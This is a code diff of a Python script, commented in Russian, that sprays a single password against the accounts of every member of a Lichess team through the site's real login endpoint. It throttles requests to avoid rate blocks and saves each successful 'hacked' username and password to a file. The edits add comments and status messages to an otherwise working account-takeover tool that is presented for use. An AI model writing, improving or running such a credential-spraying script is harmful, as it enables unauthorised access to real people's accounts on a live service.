@@ -12,7 +12,10 @@ def start(password, team):
     # Выводим сообщение, что список готов
     print(green + f"[+] Список пользователей получен!")
     print(
-        cyan + "[TIP] Запрос 200 означает, что акк взломан. 401 - не получилось. 429 - личесс заблокировал запрос(рекомендуется выключить программу)")
+        cyan + "[TIP] Запрос 200 означает, что акк взломан. 401 - не получилось. 429 - личесс заблокировал запрос(рекомендуется выключить программу)") # вывод подсказкм
+    #
+    print(green + f"Взломанные аккаунты будут сохранены в файл hacked_checking/{team}.txt") # вывод о том куда будут сохранятся взломанные акки
+
     # Начинаем перебор
     k = 0
     for user in users:
@@ -25,13 +28,13 @@ def start(password, team):
         r = requests.post("https://lichess.org/login",
                           data={"username": username, "password": password, "remember": "true"},
                           headers={"X-Requested-With": "XMLHttpRequest",
-                                   "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0"})
+                                   "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0"}) # пытатаемся войти в акк
 
-        print(f"{get_ts()} {r}, {username}: {password}")
+        print(cyan + f"{get_ts()} {r}, {username}: {password}")
         k += 1
 
         if str(r) == "<Response [200]>":
-            with open(f"hacked_checking/{team}.txt", "a", encoding="utf-8") as h_list:
+            with open(f"hacked_checking/{team}.txt", "a", encoding="utf-8") as h_list: # сохраняем в файл взломанные акки
                 h_list.write(f"{get_ts()} {username}: {password} \n")
 
         time.sleep(5)
